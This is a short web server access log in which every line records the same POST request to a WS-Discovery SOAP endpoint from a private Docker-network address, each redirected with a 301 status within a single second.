172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
